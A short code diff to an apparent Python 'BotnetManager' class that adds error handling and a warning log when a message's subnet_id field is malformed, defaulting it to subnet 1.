@@ -524,7 +524,11 @@ class BotnetManager:
                     return
                 msg_id    = parts[2]
                 source    = parts[3]
-                subnet_id = int(parts[5])
+                try:
+                    subnet_id = int(parts[5])
+                except ValueError:
+                    log.warning(f"Malformed botnet message (bad subnet_id): {parts!r} — defaulting to subnet 1")
+                    subnet_id = 1
                 command   = parts[6].lower()
                 args      = " ".join(parts[7:])
                 target    = None
